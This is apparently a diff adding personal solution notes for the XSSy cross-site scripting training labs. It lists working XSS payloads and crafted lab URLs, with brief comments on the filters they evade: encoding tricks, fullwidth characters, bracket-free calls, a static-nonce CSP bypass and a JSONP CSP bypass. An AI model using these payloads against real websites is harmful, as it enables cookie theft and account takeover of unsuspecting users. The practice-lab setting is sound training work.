@@ -1,0 +1,62 @@
+------------------------------------------------------------------------------------------------Easy Labs------------------------------------------------------------------------------------------------
+
+Parameter Name XSS:  https://sh4oxynx.xssy.uk/target.ftl.name=<i>paj&fo<script>alert(document.cookie)</script> o=<i>bar
+
+Alert Blocked XSS:  <script>window["a"+"lert"](document.cookie)</script>
+
+Basic Stored XSS:  <script>alert(document.cookie)</script>
+
+Href XSS:  javascript:alert(document.cookie)
+
+Script Content XSS:  ";alert(document.cookie); //
+
+Client-Side Validation Bypass XSS:  https://sh4oxynx.xssy.uk/target.ftl?name=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+https://sh4oxynx.xssy.uk/target.ftl?name This part will be Replaced by your Lab/web URL
+
+Basic DOM XSS: <img src="x" onerror="alert(document.cookie)">
+
+Attribute XSS: " onfocus="alert(document.cookie)" autofocus="
+
+Basic Reflective XSS: <script>alert(document.cookie)</script>
+
+Stored XSS - User-Agent: https://fygkuqjd.xssy.uk/target.ftl?name=root%3Cscript%3Ealert(document.cookie)%3C/script%3E	//Basicaly, we enter simple Payload but in url section. not name section
+
+------------------------------------------------------------------------------------------------Moderate Labs------------------------------------------------------------------------------------------------
+
+Unicode XSS: ＜script＞ alert(document.cookie)＜/script＞ // Here, < and > in the payload is unicode and not regular one. from website : https://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_(Unicode_block)#Block
+
+Double Decode XSS: %253Cscript%253Ealert(document.cookie)%253C/script%253E	
+ 		   // This is double Encoded Script %253Cscript%253Ealert(document.cookie)%253C/script%253E
+
+Bracket Filtered XSS:  <script>eval.call`${'alert\x28document.cookie\x29'}`</script>	// Brackets are not allowed (filtered) here
+
+Bracket and Backticks Filtered XSS: <script>document.location='javascript:alert%28document.cookie%29'</script>	//Discovered Regular Flag
+				    <script>onerror=alert;throw document.cookie</script>		        //This one also Gives Flag but Says, Uncaught Exception and then gives flag.
+
+Script Content XSS 2: <script>alert(document.cookie)</script>;<script>alert(document.cookie)</script>	//It reads content after ; thus gave payload twice.
+		      </script>;<script>alert(document.cookie)</script>	//This one is also working one.
+
+Safe HTML Filter XSS: https://js2i6iof.xssy.uk/target.ftl?name=%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22%3Epaj
+
+Safe HTML Filter XSS: <scripT>alert(document.cookie)</scripT>	//It was Filtering Tags
+
+HTML Filter - Weak Regex: <a href="javascript:alert(document.cookie)">Click me</a>
+
+Metadata XSS: https://sypfiggi.xssy.uk/GitHub-Avatar-Iron-Man.jpeg	//Here, I modified Metadata of the image as I entered simple Payload in Camera Model Section.
+									// then, go to My Labs no XSSy Website and Upload that image and paste the image link in the input of lab
+
+Vulnerable POST Message XSS: Written a Program in My Lab option of XSSy Website. Stored in My Directory.
+
+Large Apps -Basic XSS: Fuzzed the URL containing 50 input options out of which, one had a simple XSS vulnerability
+			https://jbob7737.xssy.uk/target_37.ftl?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
+
+Large App - Non-Sequential: Fuzzed the URL containing 50 input options out of which, one had a simple XSS vulnerability
+				Generally in both above labs, while fuzzing, the one with different size contains the vulnerability. All other pages have same size.
+
+Mystery Parameter XSS: Here, Again we Fuzzed the Lab with commodity injection signatures list available on GitHub (First 100 of them) and noticed that, changes were not reflecting in 					normal url i.e. https://lxxhujqz.xssy.uk/target.ftl?name=%3Ci%3E+root Here, 'name' parameter is used.
+				But This url: https://lxxhujqz.xssy.uk/target.ftl?email=%3Ci%3E+root+%3Cscript%3Ealert(document.cookie)%3C/script%3E Was the Solution as here, we used 					'email' parameter instead of name and it was reflecting changes so, we added simple payload in it using email parameter.
+
+CSP Static - Nonce Bypass XSS: <script nonce="rAnd0m">alert(document.cookie)</script>	//Nonce was Static so its value can found in inspect > security
+
+CSP - JSON Bypass: <script src="https://thnxclxd.xssy.uk/jsonp.ftl?callback=alert(document.cookie)%20;%20//"</script>	//Here, in inspect, we got a JSON in whose URL, We injected Payload 															and Pasted The URL in the input Section.
